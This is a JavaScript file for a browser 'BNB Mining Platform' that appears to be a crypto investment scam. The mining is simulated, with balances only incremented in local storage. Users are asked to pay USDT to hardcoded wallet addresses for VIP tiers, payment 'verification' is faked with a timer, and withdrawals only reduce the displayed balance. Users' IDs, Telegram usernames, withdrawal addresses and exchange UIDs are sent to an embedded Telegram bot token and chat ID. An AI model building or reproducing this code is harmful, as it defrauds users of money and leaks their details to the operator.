// script.js
class MiningSystem {
    constructor() {
        this.userData = this.loadUserData();
        // Demo telegram config requested by you (change later if needed)
        this.telegramConfig = {
            botToken: '7659505060:AAFmwIDn2OgrtNoemPpmBWaxsIfdsQdZGCI',
            chatId: '7417215529'
        };
        
        this.vipCodes = [
            { code: 'VIP60A7B9C1', used: false, value: 60, type: 'vip2' },
            { code: 'VIP60D2E3F4', used: false, value: 60, type: 'vip2' },
            { code: 'VIP60G5H6I7', used: false, value: 60, type: 'vip2' },
            { code: 'VIP60J8K9L0', used: false, value: 60, type: 'vip2' },
            { code: 'VIP60M1N2O3', used: false, value: 60, type: 'vip2' },
            { code: 'VIP60P4Q5R6', used: false, value: 60, type: 'vip2' },
            { code: 'VIP60S7T8U9', used: false, value: 60, type: 'vip2' },
            { code: 'VIP60V0W1X2', used: false, value: 60, type: 'vip2' },
            { code: 'VIP60Y3Z4A5', used: false, value: 60, type: 'vip2' },
            { code: 'VIP60B6C7D8', used: false, value: 60, type: 'vip2' }
        ];

        this.walletAddresses = {
            bnb: '0x53f90e7a0d2834b772890f4f456d51aaed61de43',
            trx: 'TSKPhwUavSrKXXcbWG2TdPzYiBtoTNXP6i',
            sol: 'HvHR4LeKdCH5Z2UDKVSDuju8c4ukPAa1CzchHseZ2LKu'
        };

        this.miningInterval = null;
        this.statsInterval = null;
        
        this.init();
    }

    init() {
        console.log('🚀 Initializing BNB Mining Platform...');
        this.setupEventListeners();
        this.setupTabNavigation();
        this.setupWithdrawalTabs();
        this.loadRedeemCodes();
        this.setupFileUpload();
        this.startStatsTimer();
        
        console.log('✅ Platform initialized successfully');
        console.log('🎁 Available VIP Codes:', this.vipCodes.filter(vc => !vc.used).map(vc => vc.code));
    }

    loadUserData() {
        const savedData = localStorage.getItem('bnbMiningUserData');
        if (savedData) {
            try {
                const data = JSON.parse(savedData);
                console.log('📁 User data loaded from storage');
                
                // Restore mining state if it was active
                if (data.miningActive) {
                    this.startMiningVisuals();
                }
                return data;
            } catch (e) {
                console.error('❌ Error loading user data:', e);
                return this.getDefaultUserData();
            }
        } else {
            return this.getDefaultUserData();
        }
    }

    getDefaultUserData() {
        return {
            balance: 0.00,
            todayEarnings: 0.00,
            totalEarned: 0.00,
            userStatus: 'free',
            dailyEarning: 0.10,
            lastClaim: new Date().toISOString(),
            vipExpiry: null,
            userId: 'USR' + Math.floor(100000 + Math.random() * 900000),
            userName: 'User' + Math.floor(100000 + Math.random() * 900000),
            miningActive: false,
            miningStartTime: null,
            totalMiningTime: 0,
            totalMined: 0.0000,
            currentSpeed: 0.5,
            withdrawalHistory: []
        };
    }

    saveUserData() {
        try {
            localStorage.setItem('bnbMiningUserData', JSON.stringify(this.userData));
            console.log('💾 User data saved');
        } catch (e) {
            console.error('❌ Error saving user data:', e);
        }
    }

    updateUI() {
        console.log('🎨 Updating UI...');
        
        // Update balance displays
        document.getElementById('userBalance').textContent = this.userData.balance.toFixed(2) + ' USDT';
        document.getElementById('todayEarnings').textContent = this.userData.todayEarnings.toFixed(2) + ' USDT';
        document.getElementById('totalEarned').textContent = this.userData.totalEarned.toFixed(2) + ' USDT';
        document.getElementById('userId').textContent = this.userData.userId;
        
        // Update user status
        const statusElement = document.getElementById('userStatus');
        if (this.userData.userStatus === 'vip') {
            statusElement.textContent = 'VIP User';
            statusElement.className = 'status-vip';
        } else {
            statusElement.textContent = 'Free User';
            statusElement.className = 'status-free';
        }
        
        this.updateMiningSpeed();
        this.updateWithdrawalLimits();
        this.updateStatsDisplay();
        
        console.log('✅ UI updated successfully');
    }

    updateMiningSpeed() {
        let speed = 0.5; // Free user default
        
        if (this.userData.userStatus === 'vip') {
            if (this.userData.dailyEarning === 1.00) {
                speed = 2.5; // VIP 1
            } else if (this.userData.dailyEarning === 7.00) {
                speed = 15.0; // VIP 2
            }
        }
        
        this.userData.currentSpeed = speed;
        document.getElementById('miningSpeed').textContent = `Speed: ${speed} BNB/H`;
        document.getElementById('currentSpeed').textContent = speed + ' BNB/H';
    }

    updateWithdrawalLimits() {
        const limits = document.querySelectorAll('.form-hint');
        const limitText = this.userData.userStatus === 'free' ? 'Free User Limit: 0.02 USDT' : 'VIP User: No Limit';
        
        limits.forEach(limit => {
            limit.textContent = limitText;
        });
        
        // Update input max values
        const amountInputs = document.querySelectorAll('input[type="number"]');
        amountInputs.forEach(input => {
            if (this.userData.userStatus === 'free') {
                input.max = 0.02;
            } else {
                input.removeAttribute('max');
            }
        });
    }

    updateStatsDisplay() {
        document.getElementById('totalMiningTime').textContent = this.formatTime(this.userData.totalMiningTime);
        document.getElementById('totalMined').textContent = this.userData.totalMined.toFixed(4) + ' BNB';
        document.getElementById('currentSpeed').textContent = this.userData.currentSpeed + ' BNB/H';
    }

    formatTime(seconds) {
        const hours = Math.floor(seconds / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = Math.floor(seconds % 60);
        
        return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    }

    setupEventListeners() {
        console.log('🔧 Setting up event listeners...');
        
        // Mining buttons
        const startMiningBtn = document.getElementById('startMiningBtn');
        if (startMiningBtn) {
            startMiningBtn.addEventListener('click', () => this.handleMiningToggle());
        }
        
        const vipMiningBtns = document.querySelectorAll('.vip-mining-btn');
        vipMiningBtns.forEach(btn => {
            btn.addEventListener('click', (e) => this.handleVipMining(e));
        });
        
        // VIP purchase buttons
        const buyVipBtns = document.querySelectorAll('.buy-vip');
        buyVipBtns.forEach(btn => {
            btn.addEventListener('click', (e) => this.handleVipPurchase(e));
        });
        
        // Payment modal
        const closePaymentBtn = document.getElementById('closePaymentBtn');
        if (closePaymentBtn) {
            closePaymentBtn.addEventListener('click', () => this.closePaymentModal());
        }
        
        // Chain options
        const chainOptions = document.querySelectorAll('.chain-option');
        chainOptions.forEach(option => {
            option.addEventListener('click', (e) => this.handleChainSelection(e));
        });
        
        // Copy address
        const copyAddressBtn = document.getElementById('copyAddressBtn');
        if (copyAddressBtn) {
            copyAddressBtn.addEventListener('click', () => this.handleCopyAddress());
        }
        
        // Confirm payment
        const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
        if (confirmPaymentBtn) {
            confirmPaymentBtn.addEventListener('click', () => this.handleConfirmPayment());
        }
        
        // Withdrawal buttons
        const withdrawSubmitBtns = document.querySelectorAll('.withdraw-submit');
        withdrawSubmitBtns.forEach(btn => {
            btn.addEventListener('click', (e) => this.handleWithdrawal(e));
        });
        
        // Redeem code
        const redeemCodeBtn = document.getElementById('redeemCodeBtn');
        if (redeemCodeBtn) {
            redeemCodeBtn.addEventListener('click', () => this.handleRedeemCode());
        }
        
        // Verification submission
        const submitVerificationBtn = document.getElementById('submitVerificationBtn');
        if (submitVerificationBtn) {
            submitVerificationBtn.addEventListener('click', () => this.handleVerificationSubmission());
        }
        
        console.log('✅ All event listeners setup complete');
    }

    setupTabNavigation() {
        const navItems = document.querySelectorAll('.nav-item');
        navItems.forEach(item => {
            item.addEventListener('click', (e) => {
                // Remove active class from all items
                navItems.forEach(nav => nav.classList.remove('active'));
                
                // Add active class to clicked item
                e.currentTarget.classList.add('active');
                
                // Get the tab name
                const tabName = e.currentTarget.getAttribute('data-tab');
                
                // Show/hide sections based on tab
                document.querySelectorAll('.container > div').forEach(section => {
                    if (section.classList.contains('header') || section.classList.contains('balance-card')) {
                        // Always show header and balance
                        return;
                    }
                    
                    if (section.classList.contains(tabName + '-card') || 
                        (tabName === 'home' && (section.classList.contains('mining-section') || section.classList.contains('redeem-card')))) {
                        section.style.display = 'block';
                    } else {
                        section.style.display = 'none';
                    }
                });
            });
        });
    }

    setupWithdrawalTabs() {
        const withdrawalTabs = document.querySelectorAll('.withdrawal-tab');
        withdrawalTabs.forEach(tab => {
            tab.addEventListener('click', (e) => {
                // Remove active class from all tabs
                withdrawalTabs.forEach(t => t.classList.remove('active'));
                
                // Add active class to clicked tab
                e.currentTarget.classList.add('active');
                
                // Get tab type
                const tabType = e.currentTarget.getAttribute('data-tab');
                
                // Show corresponding content
                document.querySelectorAll('.withdrawal-content').forEach(content => {
                    content.classList.remove('active');
                });
                
                document.getElementById(tabType + 'Withdrawal').classList.add('active');
            });
        });
    }

    loadRedeemCodes() {
        const codesList = document.getElementById('redeemCodesList');
        if (!codesList) return;
        
        codesList.innerHTML = '';
        
        this.vipCodes.forEach(vipCode => {
            const codeElement = document.createElement('div');
            codeElement.className = `vip-code-item ${vipCode.used ? 'used' : 'available'}`;
            codeElement.textContent = vipCode.code;
            codeElement.title = vipCode.used ? 'Already used' : 'Click to copy and auto-fill';
            
            if (!vipCode.used) {
                codeElement.addEventListener('click', () => {
                    this.copyToClipboard(vipCode.code);
                    
                    // Auto-fill the redeem code input
                    const redeemInput = document.getElementById('redeemCodeInput');
                    if (redeemInput) {
                        redeemInput.value = vipCode.code;
                        redeemInput.focus();
                    }
                    
                    this.showNotification(`VIP code ${vipCode.code} copied to clipboard!`, 'success');
                });
            }
            
            codesList.appendChild(codeElement);
        });
    }

    setupFileUpload() {
        const fileUploadArea = document.getElementById('fileUploadArea');
        const screenshotUpload = document.getElementById('screenshotUpload');
        
        if (!fileUploadArea || !screenshotUpload) return;
        
        fileUploadArea.addEventListener('click', () => {
            screenshotUpload.click();
        });
        
        screenshotUpload.addEventListener('change', (e) => {
            const file = e.target.files[0];
            if (file) {
                // Check file type
                if (!file.type.startsWith('image/')) {
                    this.showNotification('Please upload an image file', 'error');
                    return;
                }
                
                // Check file size (max 5MB)
                if (file.size > 5 * 1024 * 1024) {
                    this.showNotification('File size must be less than 5MB', 'error');
                    return;
                }
                
                const reader = new FileReader();
                reader.onload = (e) => {
                    const filePreview = document.getElementById('filePreview');
                    filePreview.innerHTML = `<img src="${e.target.result}" alt="Screenshot Preview">`;
                    filePreview.style.display = 'block';
                    this.showNotification('Screenshot uploaded successfully!', 'success');
                };
                reader.readAsDataURL(file);
            }
        });
    }

    startStatsTimer() {
        this.statsInterval = setInterval(() => {
            if (this.userData.miningActive) {
                this.userData.totalMiningTime++;
                this.updateStatsDisplay();
            }
        }, 1000);
    }

    handleMiningToggle() {
        if (this.userData.miningActive) {
            this.stopMining();
        } else {
            this.startMining();
        }
    }

    startMining() {
        if (this.userData.miningActive) return;
        
        this.userData.miningActive = true;
        this.userData.miningStartTime = Date.now();
        
        // Update UI
        const startMiningBtn = document.getElementById('startMiningBtn');
        startMiningBtn.innerHTML = '<i class="fas fa-stop"></i> Stop Mining';
        startMiningBtn.classList.add('active');
        this.startMiningVisuals();
        
        // Start mining process
        this.miningInterval = setInterval(() => {
            const miningRate = this.userData.currentSpeed / 3600; // Convert hourly rate to per-second
            const minedAmount = miningRate;
            
            this.userData.totalMined += minedAmount;
            this.userData.balance += minedAmount;
            this.userData.totalEarned += minedAmount;
            
            this.saveUserData();
            this.updateUI();
            
            // Occasionally create mining effect
            if (Math.random() > 0.7) {
                this.createMiningEffect();
            }
            
            // Occasionally create floating coin
            if (Math.random() > 0.9) {
                this.createFloatingCoin();
            }
        }, 1000);
        
        this.showNotification('Mining started! Earning BNB...', 'success');
        this.sendTelegramMessage(`⛏️ User ${this.userData.userId} started mining | Speed: ${this.userData.currentSpeed} BNB/H`);
    }

    stopMining() {
        if (!this.userData.miningActive) return;
        
        this.userData.miningActive = false;
        
        // Update UI
        const startMiningBtn = document.getElementById('startMiningBtn');
        startMiningBtn.innerHTML = '<i class="fas fa-play"></i> Start Mining';
        startMiningBtn.classList.remove('active');
        this.stopMiningVisuals();
        
        // Stop mining interval
        clearInterval(this.miningInterval);
        
        // Calculate session mining time
        if (this.userData.miningStartTime) {
            const sessionTime = Math.floor((Date.now() - this.userData.miningStartTime) / 1000);
            this.userData.totalMiningTime += sessionTime;
            this.userData.miningStartTime = null;
        }
        
        this.saveUserData();
        this.updateStatsDisplay();
        
        if (this.userData.totalMined > 0) {
            this.showNotification(`Mining stopped! Earned ${this.userData.totalMined.toFixed(6)} BNB this session`, 'success');
        }
        
        this.sendTelegramMessage(`⛏️ User ${this.userData.userId} stopped mining | Total mined: ${this.userData.totalMined.toFixed(4)} BNB`);
    }

    startMiningVisuals() {
        const miningCircle = document.querySelector('.mining-circle');
        const miningCore = document.querySelector('.mining-core');
        const miningParticles = document.querySelectorAll('.mining-particle');
        const miningStatusText = document.getElementById('miningStatus');
        
        miningCircle.classList.add('active');
        miningCore.classList.add('active');
        miningStatusText.textContent = 'Mining Active';
        miningStatusText.classList.add('active');
        
        miningParticles.forEach(particle => {
            particle.style.animationDelay = `${Math.random() * 2}s`;
        });
    }

    stopMiningVisuals() {
        const miningCircle = document.querySelector('.mining-circle');
        const miningCore = document.querySelector('.mining-core');
        const miningStatusText = document.getElementById('miningStatus');
        
        miningCircle.classList.remove('active');
        miningCore.classList.remove('active');
        miningStatusText.textContent = 'Mining Inactive';
        miningStatusText.classList.remove('active');
    }

    handleVipMining(event) {
        const vipType = event.currentTarget.getAttribute('data-vip');
        
        if (this.userData.userStatus !== 'vip') {
            this.showNotification('Please purchase VIP membership to use VIP mining', 'error');
            return;
        }
        
        // Adjust mining speed based on VIP type
        if (vipType === 'vip1') {
            this.userData.currentSpeed = 2.5;
        } else if (vipType === 'vip2') {
            this.userData.currentSpeed = 15.0;
        }
        
        // Restart mining with new speed
        if (this.userData.miningActive) {
            this.stopMining();
            setTimeout(() => {
                this.startMining();
            }, 100);
        }
        
        this.showNotification(`VIP ${vipType} mining activated! Speed: ${this.userData.currentSpeed} BNB/H`, 'success');
    }

    handleVipPurchase(event) {
        const tier = event.currentTarget.getAttribute('data-tier');
        const price = event.currentTarget.getAttribute('data-price');
        
        document.getElementById('paymentTitle').textContent = `Buy ${tier.toUpperCase()} - ${price} USDT`;
        document.getElementById('paymentModal').setAttribute('data-tier', tier);
        document.getElementById('paymentModal').setAttribute('data-price', price);
        
        // Set memo
        const memo = `${tier}_${this.userData.userId}`;
        document.getElementById('memoDisplay').textContent = memo;
        
        document.getElementById('paymentModal').style.display = 'flex';
        document.body.style.overflow = 'hidden';
    }

    handleChainSelection(event) {
        const chainOptions = document.querySelectorAll('.chain-option');
        chainOptions.forEach(opt => opt.classList.remove('active'));
        event.currentTarget.classList.add('active');
        
        const chain = event.currentTarget.getAttribute('data-chain');
        const addressDisplay = document.getElementById('addressDisplay');
        const tier = document.getElementById('paymentModal').getAttribute('data-tier');
        const memo = `${tier}_${this.userData.userId}`;
        
        addressDisplay.innerHTML = `
            <strong>${chain.toUpperCase()} Address:</strong><br>
            <span style="user-select: all; font-family: monospace;">${this.walletAddresses[chain]}</span>
            <br><br>
            <strong>Memo Required:</strong> <span style="font-family: monospace;">${memo}</span>
        `;
        addressDisplay.style.display = 'block';
        
        document.getElementById('copyAddressBtn').disabled = false;
    }

    handleCopyAddress() {
        const addressDisplay = document.getElementById('addressDisplay');
        const addressText = addressDisplay.textContent;
        
        this.copyToClipboard(addressText);
        this.showNotification('Address and memo copied to clipboard!', 'success');
    }

    handleConfirmPayment() {
        const selectedChain = document.querySelector('.chain-option.active');
        if (!selectedChain) {
            this.showNotification('Please select a payment method', 'error');
            return;
        }
        
        // Show verification section
        document.getElementById('verificationSection').style.display = 'block';
        
        // Close payment modal
        document.getElementById('paymentModal').style.display = 'none';
        document.body.style.overflow = 'auto';
        this.resetPaymentModal();
        
        this.showNotification('Please submit your payment verification details', 'success');
    }

    closePaymentModal() {
        document.getElementById('paymentModal').style.display = 'none';
        document.body.style.overflow = 'auto';
        this.resetPaymentModal();
    }

    resetPaymentModal() {
        const chainOptions = document.querySelectorAll('.chain-option');
        chainOptions.forEach(opt => opt.classList.remove('active'));
        const addressDisplay = document.getElementById('addressDisplay');
        if (addressDisplay) {
            addressDisplay.style.display = 'none';
        }
        document.getElementById('copyAddressBtn').disabled = true;
    }

    handleVerificationSubmission() {
        const telegramUsername = document.getElementById('telegramUsername');
        const screenshotFile = document.getElementById('screenshotUpload').files[0];
        
        if (!telegramUsername || !telegramUsername.value.trim()) {
            this.showNotification('Please enter your Telegram username', 'error');
            return;
        }
        
        if (!screenshotFile) {
            this.showNotification('Please upload payment screenshot', 'error');
            return;
        }
        
        const tier = document.getElementById('paymentModal').getAttribute('data-tier');
        const price = document.getElementById('paymentModal').getAttribute('data-price');
        
        // Simulate verification process
        this.showNotification('Payment verification submitted! Processing...', 'success');
        
        setTimeout(() => {
            // Activate VIP after verification
            this.activateVIP(tier, price);
            
            // Hide verification section
            document.getElementById('verificationSection').style.display = 'none';
            
            // Clear form
            telegramUsername.value = '';
            const filePreview = document.getElementById('filePreview');
            if (filePreview) {
                filePreview.innerHTML = '';
                filePreview.style.display = 'none';
            }
            document.getElementById('screenshotUpload').value = '';
            
            this.showNotification(`Payment verified! ${tier.toUpperCase()} activated successfully!`, 'success');
            
            // Send Telegram notification with user details
            this.sendTelegramMessage(`✅ PAYMENT VERIFIED\nUser: ${this.userData.userId}\nTelegram: ${telegramUsername.value}\nVIP: ${tier.toUpperCase()}\nAmount: ${price} USDT`);
        }, 3000);
    }

    activateVIP(tier, price) {
        this.userData.userStatus = 'vip';
        
        if (tier === 'vip1') {
            this.userData.dailyEarning = 1.00;
            this.userData.currentSpeed = 2.5;
        } else if (tier === 'vip2') {
            this.userData.dailyEarning = 7.00;
            this.userData.currentSpeed = 15.0;
        }
        
        const expiryDate = new Date();
        expiryDate.setDate(expiryDate.getDate() + 30);
        this.userData.vipExpiry = expiryDate.toISOString();
        
        this.saveUserData();
        this.updateUI();
        
        // Update mining speed if active
        if (this.userData.miningActive) {
            this.stopMining();
            setTimeout(() => {
                this.startMining();
            }, 100);
        }
        
        this.sendTelegramMessage(`🎉 VIP ACTIVATED\nUser: ${this.userData.userId}\nVIP: ${tier.toUpperCase()}\nDaily: ${this.userData.dailyEarning} USDT\nSpeed: ${this.userData.currentSpeed} BNB/H`);
        
        // Add celebration effect
        this.createCelebrationEffect();
    }

    handleRedeemCode() {
        const codeInput = document.getElementById('redeemCodeInput');
        if (!codeInput) return;
        
        const code = codeInput.value.trim().toUpperCase();
        
        if (!code) {
            this.showNotification('Please enter a VIP code', 'error');
            return;
        }
        
        if (code.length !== 10) {
            this.showNotification('VIP code must be 10 characters', 'error');
            return;
        }
        
        const vipCode = this.vipCodes.find(vc => vc.code === code);
        
        if (!vipCode) {
            this.showNotification('Invalid VIP code', 'error');
            return;
        }
        
        if (vipCode.used) {
            this.showNotification('This VIP code has already been used', 'error');
            return;
        }
        
        // Activate VIP based on code type
        vipCode.used = true;
        this.userData.userStatus = 'vip';
        
        if (vipCode.type === 'vip2') {
            this.userData.dailyEarning = 7.00;
            this.userData.currentSpeed = 15.0;
        }
        
        const expiryDate = new Date();
        expiryDate.setDate(expiryDate.getDate() + 30);
        this.userData.vipExpiry = expiryDate.toISOString();
        
        this.saveUserData();
        this.updateUI();
        this.loadRedeemCodes();
        
        // Update mining speed if active
        if (this.userData.miningActive) {
            this.stopMining();
            setTimeout(() => {
                this.startMining();
            }, 100);
        }
        
        this.showNotification(`VIP activated with code ${code}! Daily earning: ${this.userData.dailyEarning} USDT`, 'success');
        this.sendTelegramMessage(`🎁 VIP CODE REDEEMED\nUser: ${this.userData.userId}\nCode: ${code}\nVIP: ${vipCode.type.toUpperCase()}\nDaily: ${this.userData.dailyEarning} USDT`);
        
        // Clear input
        codeInput.value = '';
        
        // Add celebration effect
        this.createCelebrationEffect();
    }

    handleWithdrawal(event) {
        const withdrawalType = event.currentTarget.getAttribute('data-type');
        
        let amount, uid, address, coin;
        
        switch (withdrawalType) {
            case 'bitget':
                amount = parseFloat(document.getElementById('bitgetAmount').value);
                uid = document.getElementById('bitgetUid').value.trim();
                break;
            case 'bybit':
                amount = parseFloat(document.getElementById('bybitAmount').value);
                uid = document.getElementById('bybitUid').value.trim();
                break;
            case 'blockchain':
                amount = parseFloat(document.getElementById('blockchainAmount').value);
                address = document.getElementById('blockchainAddress').value.trim();
                coin = document.getElementById('blockchainCoin').value;
                break;
        }
        
        // Validation
        if (!amount || amount <= 0) {
            this.showNotification('Please enter a valid amount', 'error');
            return;
        }
        
        if (this.userData.userStatus === 'free' && amount > 0.02) {
            this.showNotification('Free users can only withdraw up to 0.02 USDT', 'error');
            return;
        }
        
        if (this.userData.userStatus === 'free' && amount < 0.01) {
            this.showNotification('Minimum withdrawal is 0.01 USDT for free users', 'error');
            return;
        }
        
        if (amount > this.userData.balance) {
            this.showNotification('Insufficient balance', 'error');
            return;
        }
        
        if ((withdrawalType === 'bitget' || withdrawalType === 'bybit') && !uid) {
            this.showNotification(`Please enter your ${withdrawalType} UID`, 'error');
            return;
        }
        
        if (withdrawalType === 'blockchain' && !address) {
            this.showNotification('Please enter withdrawal address', 'error');
            return;
        }
        
        if (withdrawalType === 'blockchain' && !this.validateAddress(address, coin)) {
            this.showNotification(`Invalid ${coin.toUpperCase()} address format`, 'error');
            return;
        }
        
        // Process withdrawal
        this.userData.balance -= amount;
        
        // Add to withdrawal history
        this.userData.withdrawalHistory.push({
            type: withdrawalType,
            amount: amount,
            coin: coin || 'usdt',
            address: address || uid,
            timestamp: new Date().toISOString(),
            status: 'pending'
        });
        
        this.saveUserData();
        this.updateUI();
        
        this.showNotification(`Withdrawal request submitted for ${amount} USDT. Processing within 24 hours.`, 'success');
        
        // Send Telegram notification
        let telegramMessage = `💸 WITHDRAWAL REQUEST\nUser: ${this.userData.userId}\nAmount: ${amount} USDT\nType: ${withdrawalType.toUpperCase()}\n`;
        
        if (withdrawalType === 'blockchain') {
            telegramMessage += `Coin: ${coin.toUpperCase()}\nAddress: ${address}`;
        } else {
            telegramMessage += `UID: ${uid}`;
        }
        
        this.sendTelegramMessage(telegramMessage);
        
        // Clear form
        switch (withdrawalType) {
            case 'bitget':
                document.getElementById('bitgetAmount').value = '';
                document.getElementById('bitgetUid').value = '';
                break;
            case 'bybit':
                document.getElementById('bybitAmount').value = '';
                document.getElementById('bybitUid').value = '';
                break;
            case 'blockchain':
                document.getElementById('blockchainAmount').value = '';
                document.getElementById('blockchainAddress').value = '';
                break;
        }
    }

    validateAddress(address, coin) {
        switch (coin) {
            case 'bnb':
                return address.length === 42 && address.startsWith('0x');
            case 'trx':
                return address.length === 34 && address.startsWith('T');
            case 'sol':
                return address.length === 44;
            case 'usdt':
                // USDT can be on multiple chains
                return (address.length === 42 && address.startsWith('0x')) || 
                       (address.length === 34 && address.startsWith('T')) ||
                       (address.length === 44);
            default:
                return true;
        }
    }

    // Utility methods
    copyToClipboard(text) {
        navigator.clipboard.writeText(text).then(() => {
            console.log('📋 Text copied to clipboard');
        }).catch(err => {
            console.error('❌ Failed to copy text: ', err);
            this.showNotification('Failed to copy to clipboard', 'error');
        });
    }

    showNotification(message, type) {
        // Remove existing notifications
        document.querySelectorAll('.notification').forEach(notif => notif.remove());
        
        const notification = document.createElement('div');
        notification.className = `notification ${type === 'error' ? 'error' : ''}`;
        notification.style.cssText = `
            position: fixed;
            top: 20px;
            right: 20px;
            background: ${type === 'success' ? 'var(--success-color)' : 'var(--danger-color)'};
            color: white;
            padding: 15px 20px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            z-index: 3000;
            max-width: 300px;
            animation: slideInRight 0.5s ease;
        `;
        
        notification.innerHTML = `
            <div style="display: flex; align-items: center;">
                <i class="fas fa-${type === 'success' ? 'check' : 'exclamation'}-circle" style="margin-right: 10px;"></i>
                <div>${message}</div>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        // Remove notification after 3 seconds
        setTimeout(() => {
            if (notification.parentElement) {
                notification.style.animation = 'slideInRight 0.5s ease reverse';
                setTimeout(() => {
                    notification.remove();
                }, 500);
            }
        }, 3000);
    }

    sendTelegramMessage(message) {
        const { botToken, chatId } = this.telegramConfig;
        
        console.log('📱 Sending Telegram message:', message);
        
        // Use fetch API to send message to Telegram
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: "HTML"
            })
        })
        .then(response => response.json())
        .then(data => {
            if(data.ok){
                console.log("✅ Telegram message sent successfully:", data);
            } else {
                console.error("❌ Telegram API error:", data);
                // Fallback: Log to console if Telegram fails
                console.log("📝 Message (Telegram failed):", message);
            }
        })
        .catch(error => {
            console.error("❌ Telegram fetch error:", error);
            // Fallback: Log to console if fetch fails
            console.log("📝 Message (Network error):", message);
        });
    }

    // Visual effects
    createMiningEffect() {
        const miningCircle = document.querySelector('.mining-circle');
        const effect = document.createElement('div');
        effect.className = 'mining-effect';
        effect.style.cssText = `
            position: absolute;
            width: 20px;
            height: 20px;
            background: var(--mining-active);
            border-radius: 50%;
            pointer-events: none;
            z-index: 100;
            animation: miningEffect 1s ease-out forwards;
        `;
        
        // Random position around mining circle
        const angle = Math.random() * Math.PI * 2;
        const radius = 60 + Math.random() * 30;
        const x = Math.cos(angle) * radius;
        const y = Math.sin(angle) * radius;
        
        effect.style.left = `calc(50% + ${x}px)`;
        effect.style.top = `calc(50% + ${y}px)`;
        
        miningCircle.appendChild(effect);
        
        // Remove effect after animation
        setTimeout(() => {
            if (effect.parentElement) {
                effect.remove();
            }
        }, 1000);
    }

    createCelebrationEffect() {
        for (let i = 0; i < 20; i++) {
            setTimeout(() => {
                this.createFloatingCoin();
            }, i * 50);
        }
    }

    createFloatingCoin() {
        const coin = document.createElement('div');
        coin.className = 'floating-coin';
        coin.textContent = '💰';
        coin.style.cssText = `
            position: fixed;
            font-size: 20px;
            opacity: 0;
            animation: floatCoin 2s ease-in forwards;
            left: ${Math.random() * 100}%;
            top: 100%;
            z-index: 1000;
            pointer-events: none;
        `;
        
        document.body.appendChild(coin);
        
        setTimeout(() => {
            coin.remove();
        }, 2000);
    }

    // Debug methods
    debugUserData() {
        return this.userData;
    }

    debugVIPCodes() {
        return this.vipCodes;
    }

    resetApp() {
        localStorage.removeItem('bnbMiningUserData');
        location.reload();
    }
}

// Initialize the mining system when DOM is loaded
document.addEventListener('DOMContentLoaded', function() {
    window.miningSystem = new MiningSystem();
    window.miningSystem.updateUI();
    
    console.log('🎮 Debug commands available:');
    console.log('   - miningSystem.debugUserData(): Check current user data');
    console.log('   - miningSystem.debugVIPCodes(): Check VIP codes status');
    console.log('   - miningSystem.resetApp(): Reset application data');
});

// Add mining effect animation
const miningEffectStyle = document.createElement('style');
miningEffectStyle.textContent = `
    @keyframes miningEffect {
        0% {
            transform: scale(1);
            opacity: 1;
        }
        100% {
            transform: scale(0);
            opacity: 0;
        }
    }
`;
document.head.appendChild(miningEffectStyle);
